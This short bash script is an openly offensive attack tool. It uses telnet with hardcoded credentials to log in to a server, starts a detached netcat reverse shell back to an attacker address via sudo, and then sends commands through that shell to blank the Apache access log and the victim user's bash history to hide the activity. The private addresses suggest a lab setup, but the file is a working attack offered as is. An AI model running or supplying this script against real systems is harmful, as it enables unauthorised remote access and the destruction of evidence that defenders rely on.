#/bin/bash

##############################################################
# NetCat reverse shell; Started via Telnet; removes some logs to disguise activities
# Ing. Alexander Poschenreithner, 2017
##############################################################

# Again telnet to start it on server
echo "     => Telnet to start reverse shell"
(
echo open 10.11.12.10
sleep 1
echo "webadmin"
sleep 1
echo "lucky75"
sleep 1
echo "sudo screen -dmS reverse_shell bash -c 'sleep 30; nc -e /bin/sh 10.11.12.111 1239'"
sleep 4
) | telnet >> /tmp/attack.log


# Start local
echo "     => Listening for Server to connect - Delete access log and bash history of victim user"
(
echo "sudo echo '' > /var/log/apache2/access.log"
sleep 1
echo "sudo echo '' > /home/webadmin/.bash_history "
) | sudo nc -nvlp 1239 -q 1 >> /tmp/attack.log

